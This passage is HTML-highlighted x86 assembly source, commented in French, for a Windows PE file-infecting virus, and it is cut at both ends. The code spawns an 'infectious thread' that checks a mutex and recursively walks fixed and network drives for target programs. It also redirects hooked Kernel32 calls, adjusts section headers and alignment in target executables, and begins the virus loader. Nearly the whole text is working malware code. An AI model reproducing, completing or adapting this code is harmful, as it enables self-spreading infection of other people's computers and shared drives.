</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateThread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;[Fin de la creation de la thread]</span><span class="sc0">



</span><span class="sc1">;[Determination de l'adresse de la fonction de Kernel32 appelee par l'hote]:</span><span class="sc0">

</span><span class="sc5">renvoi_vers_fonction_appele</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;transfert du contenu des 8 premiers elements de la pile qui proviennent d'un</span><span class="sc0">
</span><span class="sc1">;PUSHAD</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">tampon_registre</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc1">;on compte le nombre d'elements semblables consecutifs dans la pile</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">test_pile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fin_test_pile</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">test_pile</span><span class="sc0">

</span><span class="sc5">fin_test_pile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">nbre_fct_k32_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">tab_adr_fct_k32_hote</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc1">;on restaure la pile telle qu'elle devrait etre sans les PUSH successifs, le</span><span class="sc0">
</span><span class="sc1">;sommet de la pile sera occupe par les valeurs mises par le PUSHAD du loader</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">tampon_registre</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;fait suivre l'appel a la fonction de Kernel32 appelee</span><span class="sc0">


</span><span class="sc1">;[Fin de la determination de la fonction appelee]</span><span class="sc0">










</span><span class="sc1">;[Debut du code de la thread infectieuse]:</span><span class="sc0">

</span><span class="sc5">proc_infectieuse</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">suite</span><span class="sc0">
</span><span class="sc5">suite</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">suite</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc13">'B:\'
</span><span class="sc0">
</span><span class="sc5">faire_une_pause</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Sleep</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">DUREE_PAUSE2</span><span class="sc0">


</span><span class="sc1">;[Verification de la presence du virus en memoire]:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">signature</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateMutexA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle_mutex</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin_thread</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetLastError</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fin_thread</span><span class="sc0">


</span><span class="sc1">;[Fin de la verification]</span><span class="sc0">




</span><span class="sc1">;[Debut de la recherche de programmes cibles]:</span><span class="sc0">

</span><span class="sc5">recherche_cible</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;[Debut de la determination du drive a explorer]:</span><span class="sc0">

</span><span class="sc5">cherche_drive</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">26</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">

</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetDriveTypeA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">DRIVE_FIXED</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exploration_repertoire</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">DRIVE_REMOTE</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">cherche_drive</span><span class="sc0">

</span><span class="sc1">;[Fin de la determination du drive a explorer]</span><span class="sc0">


</span><span class="sc1">;[Debut de l'exploration des repertoires et sous-repertoires]:</span><span class="sc0">

</span><span class="sc5">exploration_repertoire</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
                                     
</span><span class="sc5">repertoire_base_recherche</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;esi, nombre de handles dans  la pile</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">struct_recherche</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">recherche_premier_repertoire</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TOUT_FICHIER</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindFirstFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">pas_de_sous_repertoire</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">est_ce_un_repertoire</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">edi.WFD_dwFileAttributes</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">recherche_repertoire_suivant</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc5">REPERTOIRE_COURANT</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">recherche_repertoire_suivant</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc5">REPERTOIRE_PARENT</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">recherche_repertoire_suivant</span><span class="sc0">

</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">RECHERCHE_CIBLE_DANS_REPERTOIRE_COURANT</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">recherche_premier_repertoire</span><span class="sc0">

</span><span class="sc5">recherche_repertoire_suivant</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindNextFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">est_ce_un_repertoire</span><span class="sc0">

</span><span class="sc5">plus_de_sous_repertoire</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindClose</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">pas_de_sous_repertoire</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">REMONTE</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin_de_la_recherche</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">recherche_repertoire_suivant</span><span class="sc0">

</span><span class="sc5">fin_de_la_recherche</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">


</span><span class="sc1">;[Fin de l'exploration]</span><span class="sc0">


</span><span class="sc5">fin_thread</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],[</span><span class="sc5">handle_mutex</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">faire_une_pause</span><span class="sc0">

</span><span class="sc1">;[Fin de la recherche de programmes cibles]</span><span class="sc0">

</span><span class="sc1">;[Fin du code de la thread infectieuse]</span><span class="sc0">





</span><span class="sc1">;[Debut de la routine qui intercepte les erreurs]:</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc4">=</span><span class="sc5">TRUE</span><span class="sc0">
</span><span class="sc5">proc_seh</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc9">if</span><span class="sc0">

</span><span class="sc1">;[Fin de la routine qui intercepte les erreurs]</span><span class="sc0">




</span><span class="sc1">;[Debut de la fonction de recopie d'une chaine de caracteres terminee par 0]:</span><span class="sc0">
</span><span class="sc5">copie_chaine</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">octet_suivant</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">       </span><span class="sc1">;meme le 0 final de la chaine est recopie</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">octet_suivant</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;[Fin de la fonction de recopie]</span><span class="sc0">




</span><span class="sc1">;[Debut de la fonction de conversion d'une RVA en une adresse dans le fichier</span><span class="sc0">
</span><span class="sc1">;image memoire]:</span><span class="sc0">

</span><span class="sc5">rva_vers_adr_map</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">adr_map_IMAGE_FILE_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">adr_map_IMAGE_SECTION_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">cherche_section_par_rva</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">rva_localise</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">sizeof.IMAGE_SECTION_HEADER</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cherche_section_par_rva</span><span class="sc0">

</span><span class="sc5">rva_localise</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">sizeof.IMAGE_SECTION_HEADER</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">adr_map_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;[Fin de la fonction de conversion d'une RVA]</span><span class="sc0">


</span><span class="sc1">;[Debut de la fonction de conversion d'une adresse dans l'image memoire</span><span class="sc0">
</span><span class="sc1">;d'un fichier en une RVA]:</span><span class="sc0">

</span><span class="sc5">adr_map_vers_rva</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">adr_map_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">adr_map_IMAGE_FILE_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">adr_map_IMAGE_SECTION_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">cherche_section</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">section_trouve</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">sizeof.IMAGE_SECTION_HEADER</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cherche_section</span><span class="sc0">

</span><span class="sc5">section_trouve</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">sizeof.IMAGE_SECTION_HEADER</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;[Fin de la fonction de conversion d'une adresse de l'image memoire</span><span class="sc0">
</span><span class="sc1">;d'un fichier]</span><span class="sc0">


</span><span class="sc1">;[Debut de la fonction d'alignement des champs taille d'une section]:</span><span class="sc0">

</span><span class="sc5">aligne</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;les champs taille de la section sur laquelle pointe esi sont alignes</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">adr_map_IMAGE_OPTIONAL_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;alignement memoire:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;alignement fichier:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;[Fin de la fonction d'alignement]</span><span class="sc0">


</span><span class="sc1">;[Debut du code du loader du virus]:</span><span class="sc0">

</span><span class="sc5">debut_loader</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8000</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GPTR</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0"> </span><span class="sc1">;call [&lt;adr&gt;] appel a GlobalAlloc en fait</span><span class="sc0">
</span><span class="sc5">ptr2_adr_globalalloc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
